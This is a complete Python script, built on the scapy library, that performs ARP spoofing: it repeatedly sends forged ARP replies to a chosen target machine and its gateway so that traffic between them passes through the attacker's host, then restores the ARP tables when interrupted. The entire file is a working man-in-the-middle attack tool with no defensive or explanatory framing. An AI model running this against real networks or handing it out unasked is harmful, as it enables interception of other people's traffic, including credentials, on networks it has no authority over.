#! /usr/bin/env python
import sys
import time
import scapy.all as scapy
import argparse

def get_mac_address(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    for answered in answered_list:
        return answered[1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac_address = get_mac_address(target_ip)
    packets = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=spoof_ip)
    scapy.send(packets,verbose=False)

def restore(destination_ip,source_ip):
    source_mac_address = get_mac_address(source_ip)
    destination_mac_address= get_mac_address(destination_ip)
    packets = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac_address,psrc=source_ip,hwsrc=source_mac_address)
    scapy.send(packets,count=4,verbose=False)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="Enter Target IP")
    parser.add_argument("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
    options = parser.parse_args()

    if not options.target_ip:
        print("[-] No Target IP Specified type help for more info")
        sys.exit(0)
    elif not options.gateway_ip:
        print("[-] No Gateway IP Specified type help for more info")
        sys.exit(0)
    else:
        return options

options = get_arguments()
target_ip = options.target_ip
gateway_ip= options.gateway_ip
sent_packets_count=0

try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count=sent_packets_count+2
        print("\r[+] Packets sent : " + str(sent_packets_count)+"\t",end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n")
    print("[+] Detected Ctrl + C ..... Resetting ARP Tables ..... Please wait till finish\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    print("ARP Table Reset Successfully\n")
